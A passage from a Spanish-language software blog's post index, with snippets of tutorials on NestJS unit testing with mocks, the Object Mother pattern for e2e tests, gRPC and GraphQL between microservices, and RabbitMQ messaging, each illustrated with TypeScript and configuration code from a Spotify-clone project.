= { findById: jest.fn().mockReturnValue(undefined), save: jest.fn(), update: jest.fn(), findAll: jest.fn() } usecase = new RadioUseCases(mockRepository) // Se define un objeto para actualizar las canciones de una radio inexistente. const updateSongs = { radioId: \"A48BCD55-B248-4377-8BCD-E9687768BA07\", songs: [{ id: \"A48BCD55-B248-4377-8BCD-E9687768BA07\", title: \"runaway\", album: \"bonjovi\", artist: \"bonjovi\", genre: \"rock\" }] } // Se espera que llamar al método `updateSongs` lance una NotFoundException. await expect(usecase.updateSongs(updateSongs)).rejects.toThrow(NotFoundException); }) // Prueba para verificar que las canciones se actualizan correctamente en una radio existente. it('updateSongs: songs updated', async () =&gt; { // Se crea un mock del repositorio con un método `findById` que devuelve información de una radio existente. const mockRepository: RadioRepository = { findById: jest.fn().mockReturnValue({ id: 'A48BCD55-B248-4377-8BCD-E9687768BA07', name: \"rock radio\", songs: [] }), save: jest.fn(), update: jest.fn(), findAll: jest.fn() } usecase = new RadioUseCases(mockRepository) // Se define un objeto para actualizar las canciones de una radio existente. const updateSongs = { radioId: \"A48BCD55-B248-4377-8BCD-E9687768BA07\", songs: [{ id: \"A48BCD55-B248-4377-8BCD-E9687768BA07\", title: \"runaway\", album: \"bonjovi\", artist: \"bonjovi\", genre: \"rock\" }] } await usecase.updateSongs(updateSongs) expect(mockRepository.update).toBeCalledTimes(1) })})Este set de pruebas nos garantizará el comportamiento de nuestro caso de uso. Ahora, si analizamos el siguiente código:// Se crea un mock del repositorio con un método `findById` que devuelve undefined.const mockRepository: RadioRepository = { findById: jest.fn().mockReturnValue(undefined), save: jest.fn(), update: jest.fn(), findAll: jest.fn()}Hemos creado el mock de RadioRepository con el contrato específico para las operaciones de persistencia. Si en vez de crear RadioRepository hubiéramos hecho uso de las clases proporcionadas directamente por la librería de MongoDB como en este ejemplo:// model: Model&lt;RadioDocument&gt; componente complejo de crear un Mock por su gran cantidad de metodos que dependiendo de neustro caso de uso usaremos unos pocos.constructor(@InjectModel(RadioDocument.name) private model: Model&lt;RadioDocument&gt;) { super()}El mock no sería sencillo, ya que estos componentes de tipo repositorio vienen con un montón de métodos que no nos aportan nada en el contexto de casos de uso o reglas de negocio que queramos probar. Para crear pruebas unitarias de forma limpia y sencilla, solo debemos probar las partes de forma aislada y, dependiendo del caso, definir el comportamiento específico del mock.Y ahora, gracias a la inyección de dependencias, podemos crear nuestro Caso de uso RadioUseCases:const usecase = new RadioUseCases(mockRepository)Este enfoque nos permite no tener que usar las dependencias o componentes de testing que nos ofrece NestJs, ya que estos nos generarían un montón de boilerplate en testing unitario.Si quieres ejecutar las pruebas unitarias, ejecuta lo siguiente:npm run testConclusiónAl dar un pequeño vistazo a un set de pruebas unitarias sobre una arquitectura limpia, examinamos las ventajas, simplicidad, elegancia y desacople del código en aspectos más de infraestructura como pueden ser HTTP, MongoDB, Nestjs o cualquier otro componente tecnológico. Este enfoque nos asegura crear un código más mantenible y escalable.Github repository" }, { "title": "Simplificando el Testing e2e con Object Mother", "url": "/posts/simplificando-el-testing-e2e-con-object-mother/", "categories": "Arquitectura, Software,DDD,Patrones,Backend,Fullstack", "tags": "arquitectura, software,ddd,patrones,backend,fullstack", "date": "2024-01-16 02:00:00 -0300", "snippet": "¿Alguna vez te has enfrentado a la tarea de crear objetos mock para tus pruebas unitarias o e2e y has sentido que estabas escribiendo demasiado código repetitivo? Aquí les traigo un pequeño tip. Existe un patrón de diseño que puede hacer que esta tarea sea mucho más fácil y eficiente: el patrón de diseño Object Mother.¿Qué es Object Mother?El Object Mother es un patrón de diseño de creación de objetos utilizado en el desarrollo de software. Su objetivo principal es simplificar la creación de objetos mock o de prueba al proporcionar métodos y funciones que devuelven instancias preconfiguradas de objetos.Ventajas Principales: Reusabilidad: Con Object Mother, puedes reutilizar las configuraciones de objetos en varias pruebas, evitando la duplicación de código y mejorando el mantenimiento. Claridad en las Pruebas: Al utilizar un método específico para crear objetos en lugar de escribir la configuración en cada prueba, se mejora la claridad y legibilidad del código de prueba. Facilita la Mantenibilidad: Si la estructura de tus objetos cambia, solo necesitas actualizar el código en un lugar: el método de creación en el Object Mother. Esto simplifica enormemente la tarea de mantener las pruebas. Echando un vistazo a nuestra arquitectura de Spotify-clone, veremos cómo implementar object-mother para facilitar las pruebas e2e, las cuales son las más complejas y que más tiempo toma poder escribirlas.Utilizando ObjectMotherComo habíamos visto anteriormente, Object Mother nos ayuda a crear una plantilla personalizable de nuestros objetos complejos. Es una especie de factory o builder con parámetros preestablecidos, lo que nos permite crear dummy data con el menor esfuerzo.Crearemos una función ObjectMother para poder crear los datos de prueba que insertaremos en una base de datos para crear pruebas e2e del servicio music-library-ms. Crearemos la función createArtistEntity, la cual obtendrá el componente de tipo repository de typeorm y devolverá otra función que tiene parámetros por defecto del objeto a crear.// apps/music-library-ms/test/utils.ts// La función createArtistEntity acepta una instancia de la aplicación Nest.js (INestApplication).export function createArtistEntity(app: INestApplication) { // Obtiene el repositorio de la entidad \"Artist\" utilizando el token del repositorio. const repository = app.get&lt;Repository&lt;Artist&gt;&gt;(getRepositoryToken(Artist)); // La función createEntity es la que realmente se exporta y se utiliza para crear entidades de artistas. return function createEntity({ name = \"Journey\", biography = \"Amazing band\", photo = \"artist.jpg\" }: Partial&lt;CreateArtistRequest&gt;) { // Utiliza el repositorio para guardar una nueva entidad \"Artist\" con las propiedades proporcionadas o valores predeterminados. return repository.save({ name, biography, photo, }); }}Entonces, al crear un artista, esta función guardará uno preconfigurado, el cual podemos adaptar sobrescribiendo el parámetro deseado.// apps/music-library-ms/src/test/artist.e2e-spec.tsit('/artists (GET): get all artists', async () =&gt; { const create = createArtistEntity(app) await create({}) // default = journey await create({ name: \"BonJovi\" }) await create({ name: \"Scorpions\" }) return request(app.getHttpServer()) .get('/artists') .expect(200) .then(res =&gt; res.body) .then(body =&gt; expect(body).toHaveLength(3))});Bajo esta misma lógica, podemos crear objetos de tipo mock relacionados entre sí para crear estructuras de datos más complejas.// apps/music-library-ms/src/test/songs.e2e-spec.tsit('/songs (GET): get all songs', async () =&gt; { const createArtist = createArtistEntity(app) const createAlbum = createAlbumEntity(app) const createSong = createSongEntity(app) const createGenre = createGenreEntity(app) const genre = await createGenre({ name: \"rock\" }) const journey = await createArtist({ name: \"journey\" }) const frontiers = await createAlbum({ title: \"frontiers\", artistId: journey.id }) await createSong({ title: \"song1\", albumId: frontiers.id, artistId: journey.id, genreId: genre.id }) await createSong({ title: \"song2\", albumId: frontiers.id, artistId: journey.id, genreId: genre.id }) await createSong({ title: \"song3\", albumId: frontiers.id, artistId: journey.id, genreId: genre.id }) const res = await request(app.getHttpServer()) .get(`/songs`) .expect(HttpStatus.OK) expect(res.body).toHaveLength(3) const titles = res.body.map(song =&gt; song.title) expect(titles).toContain('song1') expect(titles).toContain('song2') expect(titles).toContain('song3')})En esta prueba e2e creamos un objeto artista con álbumes y canciones.Conclusión:El patrón de diseño Object Mother puede ser una herramienta invaluable para simplificar y mejorar la eficiencia en la creación de objetos mock en tus pruebas unitarias. Al adoptar este enfoque, no solo reducirás la redundancia en tu código de prueba, sino que también facilitarás la mantenibilidad y comprensión de tus pruebas.Github repository" }, { "title": "Comunicación síncrona avanzada en Microservicios", "url": "/posts/comunicacion-sincrona-avanzada-en-microservicios/", "categories": "Microservicios,, gRPC,, NestJs,, GraphQL", "tags": "microservicios,, grpc,, nestjs,, graphql", "date": "2024-01-10 02:00:00 -0300", "snippet": "En una arquitectura de microservicios, podemos comunicar nuestras aplicaciones de forma síncrona y asíncrona. En este artículo, exploraremos comunicaciones síncronas avanzadas. Si bien RESTful es la manera más sencilla de comunicarnos con un microservicio, la eficiencia y flexibilidad en las comunicaciones entre servicios son fundamentales. Dos tecnologías que han revolucionado esta área son gRPC y GraphQL. Estas herramientas ofrecen enfoques distintos pero potentes para manejar las comunicaciones entre microservicios, cada una con sus propias ventajas y casos de uso.gRPC para comunicaciones eficientes¿Qué es gRPC?gRPC es un framework de comunicación de código abierto desarrollado por Google. Utiliza el protocolo HTTP/2 para la comunicación de datos de forma eficiente, permitiendo a los desarrolladores definir sus servicios mediante el lenguaje de definición de interfaz (IDL) Protocol Buffers. Esta tecnología está diseñada para ser rápida, eficiente y escalable, ideal para entornos distribuidos.Ventajas de gRPC Rendimiento: Utiliza HTTP/2, lo que permite la multiplexación de solicitudes, minimizando la latencia y mejorando el rendimiento. Tipado fuerte: Gracias a Protocol Buffers, ofrece un sistema de tipos fuertemente tipado que facilita la definición y validación de datos. Bidireccional y streaming: Admite la comunicación bidireccional y transmisión de datos en tiempo real mediante streaming, lo que lo hace adecuado para aplicaciones con necesidades de actualización constante de datos, como chats o sistemas de seguimiento en tiempo real.Desventajas de gRPC Complejidad de implementación: La curva de aprendizaje inicial puede ser pronunciada, especialmente para equipos que no están familiarizados con Protocol Buffers o el paradigma de comunicación basado en RPC (Remote Procedure Call). Problemas de visibilidad y debugging: Al utilizar un formato binario para la transferencia de datos, puede ser más difícil depurar y visualizar los datos transmitidos en comparación con formatos de texto utilizados en otros protocolos, como REST. Restricciones en la interoperabilidad: Aunque gRPC es altamente eficiente dentro de su ecosistema, puede haber limitaciones al interactuar con sistemas que no admiten o tienen dificultades para integrarse con HTTP/2 o Protocol Buffers.Implementando gRPC con NestJsNestJs nos provee una manera sencilla de implementar un servicio con gRPC. Si bien tendremos que saber cómo implementar el archivo .proto, lo demás será sencillo. En el siguiente ejemplo, basado en el stack de microservicios de Spotify-clone, analizaremos la comunicación de una aplicación de tipo backend-for-frontend llamada mobile-bff, que se comunicará con el microservicio music-library-ms, el cual provee el catálogo musical.Este ejemplo es bastante cercano a la realidad, ya que una aplicación móvil necesita mayor eficiencia en las conexiones. Cuando las aplicaciones móviles se conecten a un servidor backend donde sus servicios internos utilicen gRPC, ayudará a reducir la latencia y el tráfico de red entre un servicio y otro, resultando en una mejor respuesta del lado del cliente.Definiendo el contrato con un archivo .protoEste será nuestro contrato. Este archivo debe ser el mismo para todos los servicios que utilicen gRPC.// libs/music-library-grpc/src/music-catalog.protosyntax = \"proto3\";package catalog;// Importa los paquetes necesariosimport \"google/protobuf/empty.proto\";import \"google/protobuf/wrappers.proto\";message ID { string id = 1;}message Album { string id = 1; string title = 2; string photo = 3; int32 year = 4;}message Artist { string id = 1; string name = 2; string photo = 3; string biography = 4;}message Genre { string id = 1; string name = 2;}message Song { string id = 1; string title = 2; string video = 3; int32 plays = 4; int32 duration = 5; string artist_id = 6; string album_id = 7; string genre_id = 8;}service ArtistService { rpc GetAllArtists(google.protobuf.Empty) returns (stream Artist); rpc GetArtistById(ID) returns (Artist);}service AlbumService { rpc GetAllAlbums(google.protobuf.Empty) returns (stream Album); rpc GetAlbumById(ID) returns (Album); rpc GetAlbumsByArtistId(ID) returns (stream Album);}service SongService { rpc GetAllSongs(google.protobuf.Empty) returns (stream Song); rpc GetSongById(ID) returns (Song); rpc GetSongsByIds(stream ID) returns (stream Song); rpc GetSongsByArtistId(ID) returns (stream Song); rpc GetSongsByAlbumId(ID) returns (stream Song); rpc GetSongsByGenreId(ID) returns (stream Song);}service GenreService { rpc GetAllGenres(google.protobuf.Empty) returns (stream Genre); rpc GetGenreById(ID) returns (Genre);}Básicamente, aquí tendremos: messages: son la estructura de datos que intercambiaremos entre los servicios services: son las operaciones disponiblesEl servicio music-library-ms expondrá los servicios mediante la anotación @Controller. NestJS sabrá que este controlador corresponde a un endpoint gRPC, ya que configuraremos nuestra aplicación como microservicio.//apps/music-library-ms/src/main.tsapp.connectMicroservice({ transport: Transport.GRPC, options: { package: 'catalog', protoPath: join(__dirname, 'music-catalog.proto'), },})await app.startAllMicroservices()Nuestro controlador expondrá los servicios.// apps/music-library-ms/src/music-catalog/infrastructure/grpc/catalog.controller.ts@Controller()export class CatalogController { constructor(private catalog: CatalogUseCases) { } @GrpcMethod('ArtistService', 'GetAllArtists') getAllArtists(data: any, metadata: Metadata, call: ServerUnaryCall&lt;any, any&gt;): Observable&lt;Artist&gt; { return this.catalog.findAllArtists() } @GrpcMethod('ArtistService', 'GetArtistById') getArtistById(data: ID, metadata: Metadata, call: ServerUnaryCall&lt;any, any&gt;): Observable&lt;Artist&gt; { return this.catalog.findArtistById(data.id) } // other implementations of CatalogUseCases}La clase CatalogUseCases tendrá lógica para obtener el catálogo musical.Básicamente, tendremos nuestro servidor gRPC listo. Ahora definiremos el cliente en la aplicación mobile-bff:// apps/mobile-bff/src/mobile-bff.module.ts@Module({ imports: [ ClientsModule.register([ { name: 'MUSIC_CATALOG_PACKAGE', transport: Transport.GRPC, options: { package: 'catalog', protoPath: join(__dirname, 'music-catalog.proto'), }, }, ]), ], providers: [ MusicCatalogClient ], exports: [ MusicCatalogClient ] })export class MusicLibraryGrpcModule {}Definimos nuestro cliente gRPC con el módulo ClientModule. Ahora, basados en el archivo .proto que definimos anteriormente, creamos el modelo en código con TypeScript.// libs/music-library-grpc/messages.tsexport interface ID { id: string;}export interface Album { id: string; title: string; photo: string; year: number;}export interface Artist { id: string; name: string; photo: string; biography: string;}export interface Genre { id: string; name: string;}export interface Song { id: string; title: string; video: string; plays: number; duration: number; artist_id: string; album_id: string; genre_id: string;}// libs/music-library-grpc/services.tsexport interface ArtistService { GetAllArtists({}): Observable&lt;Artist&gt;; GetArtistById(request: ID): Observable&lt;Artist&gt;;}export interface AlbumService { GetAllAlbums({}): Observable&lt;Album&gt;; GetAlbumById(request: ID): Observable&lt;Album&gt;; GetAlbumsByArtistId(request: ID): Observable&lt;Album&gt;;}export interface SongService { GetAllSongs({}): Observable&lt;Song[]&gt;; GetSongById(request: ID): Observable&lt;Song&gt;; GetSongsByIds(request: ID[]): Observable&lt;Song&gt;; GetSongsByArtistId(request: ID): Observable&lt;Song&gt;; GetSongsByAlbumId(request: ID): Observable&lt;Song&gt;; GetSongsByGenreId(request: ID): Observable&lt;Song&gt;; }export interface GenreService { GetAllGenres({}): Observable&lt;Genre&gt;; GetGenreById(request: ID): Observable&lt;Genre&gt;;}Para instanciar los servicios de gRPC, debemos crear estos componentes de la siguiente manera:// libs/music-library-grpc/music-catalog.client.ts@Injectable()export class MusicCatalogClient implements OnModuleInit { private artistService: ArtistService; private albumService: AlbumService; private songService: SongService; private genreService: GenreService; constructor(@Inject('MUSIC_CATALOG_PACKAGE') private client: ClientGrpc) { } onModuleInit() { this.artistService = this.client.getService&lt;ArtistService&gt;('ArtistService'); this.albumService = this.client.getService&lt;AlbumService&gt;('AlbumService'); this.songService = this.client.getService&lt;SongService&gt;('SongService'); this.genreService = this.client.getService&lt;GenreService&gt;('GenreService'); } findAllArtists() { return this.artistService.GetAllArtists({}); } // ... other methods}De esta forma, la clase MusicCatalogClient implementará un Facade para exponer los servicios. Finalmente, podemos importar nuestro módulo en la aplicación mobile-bff.// apps/mobile-bff/src/mobile-bff.module.ts@Module({ imports: [ MusicLibraryGrpcModule, // other modules ],})export class MobileBffModule { }Ahora podremos usar nuestro cliente gRPC.@Injectable()export class SomeService { constructor(private grpc: MusicCatalogClient) {}}GraphQL: Poderoso lenguaje de consulta¿Qué es GraphQL?GraphQL es un lenguaje de consulta y manipulación de datos desarrollado por Facebook. A diferencia de las API REST tradicionales, donde los clientes reciben datos predefinidos, GraphQL permite a los clientes solicitar solo los datos que necesitan, lo que lo hace altamente flexible y eficiente en términos de consumo de recursos.GraphQL y su lenguaje de consultaGraphQL en sí mismo es un lenguaje de consulta y manipulación de datos que permite a los clientes definir la estructura de los datos que desean recibir. Esto se hace mediante la construcción de consultas GraphQL, que especifican los campos exactos que el cliente necesita de los servicios o APIs.El lenguaje de consulta de GraphQL tiene una sintaxis específica para construir estas consultas. Aquí hay un ejemplo básico de cómo se vería una consulta GraphQL:query { user(id: 123) { name email posts { title content } }}En esta consulta, se está pidiendo información sobre un usuario específico por su ID, solicitando el nombre, el correo electrónico y los títulos y contenidos de sus publicaciones.Las consultas GraphQL son flexibles y permiten anidar campos y especificar relaciones entre ellos de manera muy estructurada. Además de las consultas, GraphQL también admite otras operaciones, como mutaciones para la modificación de datos y suscripciones para establecer canales de comunicación en tiempo real.El Playground de consultasA su vez, GraphQL, al levantar un servicio, nos permite acceder a un playground donde podremos realizar consultas y mutaciones. También tendremos la documentación autogenerada en base a nuestro código de qué consultas, mutaciones y suscripciones podremos realizar.Ventajas de GraphQL Solicitudes precisas de datos: Permite a los clientes solicitar solo la información necesaria mediante consultas específicas. Flexibilidad en consultas: Los clientes pueden definir la estructura exacta de los datos que desean recibir, permitiendo anidamiento de campos y especificación de relaciones entre ellos de manera más flexible y estructurada. Reducción del número de solicitudes: Al poder solicitar múltiples recursos a través de una sola consulta, se reduce la necesidad de realizar múltiples solicitudes al servidor. Herramientas de desarrollo robustas: Cuenta con herramientas de desarrollo sólidas, como GraphiQL, que facilitan la exploración del esquema y la construcción de consultas.Desventajas de GraphQL Curva de aprendizaje inicial: Para aquellos nuevos en GraphQL, puede requerir tiempo comprender su sintaxis y las mejores prácticas para el diseño del esquema. Cacheo y caché compartido: La complejidad de las consultas personalizadas puede dificultar el cacheo efectivo de consultas, aunque herramientas como Apollo Client ofrecen soluciones para mitigar este problema. Posible ineficiencia en consultas anidadas: Consultas profundamente anidadas o complejas pueden dar lugar a consultas excesivamente pesadas que requieren una gestión cuidadosa para garantizar el rendimiento del servidor. Carga de trabajo en el servidor: Una mala gestión de consultas complejas o maliciosas podría aumentar la carga en el servidor, especialmente si no se implementan medidas adecuadas de seguridad y control de consultas.Implementando un servidor GraphQLAhora implementaremos un ejemplo de GraphQL siguiendo el mismo ejemplo anterior. Configuraremos nuestra aplicación mobile-bff como un servidor GraphQL que consume el microservicio music-library-ms con gRPC.Para crear un servidor GraphQL debemos crear los siguientes componentes: Tipos y campos: modelo de datos donde definimos nuestros modelos y sus propiedades Queries: estructura de las operaciones de lectura sobre GraphQL Resolvers: son los servicios que devolverán o realizarán las operaciones definidas en el modelo GraphQL.Nestjs nos permite usar decoradores para realizar el modelo. Sin embargo, también es posible crear un archivo .gql, el cual representará el modelo GraphQL, pero en ese caso debemos implementar el mapeo de las operaciones y los objetos.En nuestro ejemplo, solo habrá operaciones de lectura, es decir, queries, y utilizaremos decoradores.Definimos nuestro módulo mobile-bff.module.// apps/mobile-bff/src/mobile-bff.module.ts@Module({ imports: [ ConfigModule.forRoot(), GraphQLModule.forRoot&lt;ApolloDriverConfig&gt;({ driver: ApolloDriver, autoSchemaFile: join(process.cwd(), 'apps/mobile-bff/schema.gql'), }), MusicLibraryGrpcModule, ], providers: [ ArtistResolver, AlbumResolver, GenreResolver, SongResolver, RadioResolver, ],})export class MobileBffModule { }Ahora definimos nuestro modelo de datos.// apps/mobile-bff/src/music-catalog/graphql/models/artist.model.ts@ObjectType()export class Artist { @Field({ nullable: true }) id: string; @Field() name: string; @Field({ nullable: true }) photo?: string; @Field({ nullable: true }) biography?: string; @Field(type =&gt;[Album], { nullable: 'itemsAndList' }) albums?: Album[] }Definiremos nuestra clase resolver.// apps/mobile-bff/src/music-catalog/graphql/resolvers/artist.resolver.ts@Resolver(of =&gt; Artist)export class ArtistResolver { constructor(private grpc: MusicCatalogClient) {} @Query(returns =&gt; Artist) artistById(@Args('id') id: string) { return this.grpc.findArtistById(id) } @Query(returns =&gt; [Artist]) artists() { return this.grpc.findAllArtists().pipe(toArray()) } @ResolveField() async albums(@Parent() artist: Artist) { return this.grpc.findAlbumsByArtistId(artist.id).pipe(toArray()) } }Finalmente, podremos probar nuestro ejemplo de nuestro repositorio de la siguiente manera:#!/bin/bash# levanta la infraestructuranpm run start:infra# levanta nuestro catalog musical con el servidor gRPC activonpm run start:music-library# levanta el backend for frontend el cual actúa como cliente gRPC y servidor GraphQLnpm run start:mobile-bffAhora puedes realizar consultas en el playground en la URL: http://localhost:3014/graphql.ConclusiónEstablecer una comunicación entre microservicios no solo se basa en el popular enfoque de APIs REST. En esta ocasión destacamos gRPC y GraphQL, con sus casos de uso correspondientes. Definir la estrategia adecuada nos ayudará a crear sistemas que cumplan de mejor manera requerimientos avanzados en proyectos basados en microservicios.Github repository" }, { "title": "Microservicios 3 Comunicación entre microservicios", "url": "/posts/comunicaci%C3%B3n-entre-microservicios/", "categories": "Microservicios,, NestJs,RabbitMQ", "tags": "microservicios,rabbitmq,, typescript,, javascript", "date": "2023-12-13 02:00:00 -0300", "snippet": "En arquitecturas orientadas a microservicios, contamos con numerosos componentes, aplicaciones y sistemas encargados de realizar tareas y procesos. Cada tarea o proceso puede recibir una entrada, procesarla y generar una salida. A su vez, esta salida puede ser devuelta o asignada a otro componente. Para lograr orquestar estos procesos se utilizan los protocolos de comunicación. En las arquitecturas de microservicios y en los sistemas distribuidos, la comunicación desempeña un papel crucial. Sin ella, estos sistemas no existirían. En este artículo exploraremos cómo funcionan las comunicaciones en aplicaciones basadas en microservicios.¿Qué son los protocolos?Los protocolos básicamente nos indican cómo los sistemas deben comunicarse entre sí. Definimos un formato de petición y un formato de respuesta con el cual podremos comunicar dos sistemas de una manera estandarizada. Estas pautas son descritas en documentos llamados RFC. La mayoría del tiempo, para nosotros, los protocolos son algo más ligado al bajo nivel. Ahora tenemos librerías y tecnologías que trabajan con estos con mayor abstracción y así podemos desarrollar soluciones con mayor facilidad.Sin embargo, no está de más recordar estos conceptos fundamentales en el mundo de los microservicios, ya que existen un montón de arquitecturas y tecnologías involucradas en sistemas más complejos. Saber qué pasa por debajo de una librería o tecnología nos ayudará a resolver problemas que van más allá del código, los cuales la mayor parte del tiempo son los más difíciles de encontrar.Actualmente, una forma de comunicar dos aplicaciones es mediante RESTful, un enfoque popular y súper simple de implementar que por debajo usa HTTP. RESTful no es la única manera en que dos aplicaciones pueden comunicarse. A continuación, hablaremos de las distintas maneras que tenemos disponibles en arquitecturas orientadas a microservicios para la comunicación de aplicaciones.Tipos de comunicación entre microserviciosLos microservicios, al ser aplicaciones independientes con necesidad de comunicarse con otras aplicaciones, tendremos disponibles básicamente dos categorías de comunicación síncronas y asíncronas.Comunicación síncronaEn la comunicación síncrona, un microservicio espera una respuesta inmediata después de enviar una solicitud a otro microservicio. Esto se asemeja a una conversación en tiempo real, donde el microservicio solicitante detiene su ejecución y espera la respuesta antes de continuar. Dentro de este enfoque tenemos a RESTful, GraphQL o Remote Call Procedures (RPC).Comunicación asíncronaEn la comunicación asíncrona, los microservicios envían mensajes sin esperar una respuesta inmediata. Esto se asemeja a dejar una nota para alguien, donde no hay una interacción directa en tiempo real. Los sistemas de mensajería como RabbitMQ, Apache Kafka o Amazon SQS se utilizan comúnmente para la comunicación asíncrona entre aplicaciones.¿Cuándo usar asíncrono vs síncrono?La elección entre comunicación síncrona y asíncrona en microservicios depende de varios factores, y cada enfoque tiene sus propias fortalezas dependiendo del contexto. Básicamente, podemos tomar las siguientes consideraciones: Comunicación síncrona: Usa esto cuando necesites una respuesta inmediata para continuar con una tarea específica o cuando la consistencia de los datos sea crucial. Comunicación asíncrona: Opta por esto cuando busques escalabilidad, desacoplamiento entre microservicios o cuando necesites procesar tareas en segundo plano sin bloquear otras operaciones. En la práctica, a menudo es útil una combinación de ambos enfoques para diferentes casos o situaciones. A continuación, se detallan las ventajas y desventajas de ambos enfoques.Ventajas de la comunicación asíncrona: Permite la desacoplación entre microservicios, lo que significa que pueden funcionar de forma independiente. Mayor escalabilidad ya que los microservicios no están esperando respuestas. Mejor tolerancia a fallos, ya que un microservicio puede seguir funcionando aunque el receptor esté temporalmente inactivo.Desventajas de la comunicación asíncrona: Puede ser más complejo de diseñar y mantener, ya que los sistemas deben gestionar la llegada y el procesamiento de mensajes de manera independiente. La gestión de errores puede ser más complicada debido a la falta de respuesta inmediata.Ventajas de la comunicación síncrona: Simplifica el manejo de errores y excepciones. Es más fácil de entender y depurar, ya que el flujo de control es lineal y directo.Desventajas de la comunicación síncrona: Puede aumentar la latencia, ya que el microservicio solicitante debe esperar la respuesta. La sobrecarga de red puede ser un problema si hay muchas solicitudes simultáneas. Si un microservicio está inactivo o es lento, puede afectar a los demás que dependen de él.Ejemplo de comunicación síncronaCrearemos un pequeño ejemplo de un cliente HTTP con NestJS, basándonos en nuestra arquitectura de Spotify-Clone.Creando un cliente HTTP reutilizableEl siguiente código ejemplifica el uso de HttpModule en NestJS. Esto nos permite establecer propiedades de manera global para el cliente HTTP. Esta aproximación nos brinda la oportunidad de configurar nuestro cliente HTTP de forma única, evitando repeticiones.// ejemplo básico de uso de HttpModule@Module({ imports: [ HttpModule.register({ baseURL: 'http://localhost:3000/api-url', timeout: 5000, maxRedirects: 5, }), ], providers: [MusicLibraryClient],})export class MusicLibraryModule {}Ahora crearemos un servicio llamado MusicLibraryClient, el cual será el cliente HTTP del microservicio music-library. Este microservicio es el encargado de obtener información sobre artistas, álbumes y canciones de Spotify-Clone.// Definimos una clase de Error para evitar la verbosidad de un AxiosError al momento de realizar un catchtype Props = { message: string; status: number; response: string; url: string;}export class HttpClientError extends Error { public readonly status: number; public readonly response: string; public readonly url: string; constructor({ message, status: statusResponse, response: textResponse, url }: Props) { super(message); this.name = this.constructor.name; this.status = statusResponse; this.response = textResponse; this.url = url; Object.setPrototypeOf(this, HttpClientError.prototype); }}// Definimos nuestro cliente reutilizable@Injectable()export class HttpClient { constructor(private readonly http: HttpService) { } get&lt;T = any&gt;(endpoint: string, config?: AxiosRequestConfig): Observable&lt;T&gt; { const url = `/${endpoint}` return this.http.get&lt;T&gt;(url, config).pipe( map(res =&gt; res.data), catchError((error) =&gt; { if (isAxiosError(error)) { throw new HttpClientError({ message: error.message, status: error.response?.status || 500, url: error.config.url || \"\", response: error.response?.data || 'Unknown error', }) } throw error }) ); }} // definimos nuestro modulo personalizado para ser usado con aplicaciones basadas en NestJSimport { Module } from '@nestjs/common';import { HttpClient } from './client/http-client';import { HttpModule, HttpModuleAsyncOptions } from '@nestjs/axios';@Module({})export class HttpClientModule { static registerAsync(options: HttpModuleAsyncOptions) { return { module: HttpClientModule, imports: [ HttpModule.registerAsync(options) ], providers: [ HttpClient ], exports: [ HttpClient ] } }}Y utilizamos nuestro componente en clases de tipo servicio.@Injectable()export class ArtistAPI { constructor(private client: MusicLibraryClient) { } findById(id: string) { return this.client.get&lt;Artist&gt;(`artists/${id}`) } findAll() { return this.client.get&lt;Artist[]&gt;(`artists`) }}Este enfoque de cliente tiene las siguientes ventajas: Toda lógica ligada a HTTP está centralizada en nuestro componente HttpClient. Encapsulamos toda la lógica de la librería Axios dentro de nuestro cliente, evitando así acoplarnos a una solución en específico. Las clases que usen el cliente podrán crear dominios más desacoplados.Ejemplo de comunicación asíncronaAhora crearemos un ejemplo de comunicación asíncrona con el siguiente caso de uso, basado en la arquitectura de nuestro Spotify-Clone:Cuando se crea un nuevo álbum de un artista, debemos enviar un correo electrónico de notificación a los usuarios que estén interesados en las noticias del artista.Para lograr esto, lo haremos mediante una cola de mensajería. Esta cola básicamente recibe mensajes de aplicaciones productoras y estos mensajes serán escuchados por aplicaciones suscriptoras. Cada aplicación suscriptora podrá realizar alguna operación o tarea con la información contenida en el mensaje.Ejemplo básico de mensajería con RabbitMQ.Crearemos un ejemplo con RabbitMQ, el cual es un servicio de colas de mensajería. Para levantarlo, debemos hacer uso de docker-compose.version: '3'services: rabbitmq: container_name: rabbitmq image: rabbitmq:3-management-alpine ports: - 5672:5672 - 15672:15672 environment: RABBITMQ_DEFAULT_USER: ${RABBITMQ_USER} RABBITMQ_DEFAULT_PASS: ${RABBITMQ_PASS} networks: - microservices-architectureNestJS nos provee un módulo de RabbitMQ con el que podremos implementar los casos de uso más comunes. Si no conoces nada sobre RabbitMQ, te recomiendo que leas este post que profundiza más en detalle: Enlace.Ahora simularemos un microservicio que envía correos. Este servicio estará escuchando los mensajes que se reciban en la cola spotify-clone y dependiendo del tipo de mensaje, enviará un correo electrónico.// Definimos el RabbitMqModule con la configuración de RabbitMQ@Module({ // ... module configuration})export class RabbitmqQueueModule { static getMicroserviceOptions(): any { const user = process.env.RABBITMQ_USER const password = process.env.RABBITMQ_PASS const host = process.env.RABBITMQ_HOST const amqpurl = `amqp://${user}:${password}@${host}:5672` return { transport: Transport.RMQ, options: { urls: [ amqpurl ], queue: QUEUE_NAME, queueOptions: { durable: false }, } } }}// Iniciamos un microservicio de NestJs en main.tsasync function bootstrap() { const app = await NestFactory.createMicroservice( MailingMsModule, RabbitmqQueueModule.getMicroserviceOptions() ); await app.listen();}Una vez levantado nuestro microservicio con RabbitMQ, se creará una cola en el servidor de RabbitMQ la cual estará lista para recibir mensajes. En este ejemplo, los mensajes de nuevos álbumes creados serán recibidos por medio de los clásicos controladores de NestJS. En este caso, ya no se utilizan para una API REST, sino que NestJS los transformará automáticamente para RabbitMQ.Para que podamos escuchar mensajes lo haremos mediante la anotación @MessagePattern('EVENT_NAME') en la cual especificamos el patrón de mensajes que queremos escuchar.@Controller()export class QueueController { constructor(private readonly email: EmailService) {} @MessagePattern('new-album') onNewAlbum(@Payload() data: NewAlbumMessage, @Ctx() context: RmqContext) { this.email.notifyNewAlbum(data) }}Cuando un mensaje de new-album sea recibido por nuestro controlador, se invocará el servicio de email para enviar una notificación a los usuarios interesados en el artista.Configuración del cliente de mensajeríaAhora debemos crear un cliente de RabbitMQ que se encargará de enviar mensajes a la cola. Lo haremos mediante el método registerAsync() del módulo ClientModule y definiremos la siguiente configuración:export const RABBITMQ_PRODUCER_CLIENT = 'spotifyclone-queue-client'export const QUEUE_NAME = 'spotify-queue'@Module({ imports: [ ClientsModule.registerAsync([ { name: RABBITMQ_PRODUCER_CLIENT, imports: [ ConfigModule.forRoot() ], useFactory: (config: ConfigService) =&gt; { const user = config.get('RABBITMQ_USER') const password = config.get('RABBITMQ_PASS') const host = config.get('RABBITMQ_HOST') const amqp = `amqp://${user}:${password}@${host}:5672` return { transport: Transport.RMQ, options: { 